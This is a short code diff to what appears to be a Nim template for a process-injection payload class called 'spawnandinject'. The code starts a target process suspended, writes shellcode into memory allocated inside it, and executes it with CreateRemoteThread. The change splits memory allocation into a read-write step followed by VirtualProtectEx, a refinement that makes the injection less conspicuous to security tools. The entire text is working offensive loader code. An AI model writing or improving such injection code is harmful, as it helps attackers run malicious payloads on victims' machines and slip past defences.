@@ -30,8 +30,10 @@ class spawnandinject:
 
     discard {CreateProcessA}(nil, "$target", nil, nil, FALSE, CREATE_SUSPENDED, nil, nil, &si, &pi)
 
-    let address = {VirtualAllocEx}(pi.hProcess, nil, {shellcodeSize}, MEM_COMMIT or MEM_RESERVE, $memoryPermission)
+    let address = {VirtualAllocEx}(pi.hProcess, nil, {shellcodeSize}, MEM_COMMIT or MEM_RESERVE, PAGE_READWRITE)
     discard {WriteProcessMemory}(pi.hProcess, address, addr(shellcode[0]), {shellcodeSize}, nil)
+    var oldProtect: DWORD
+    discard {VirtualProtectEx}(pi.hProcess, address, {shellcodeSize}, $memoryPermission, &oldProtect)
     let hThread = {CreateRemoteThread}(pi.hProcess, nil, 0.SIZE_T, cast[LPTHREAD_START_ROUTINE](address), nil, 0, nil)
     {WaitForSingleObject}(hThread, int32(500))
     discard {CloseHandle}(hThread)
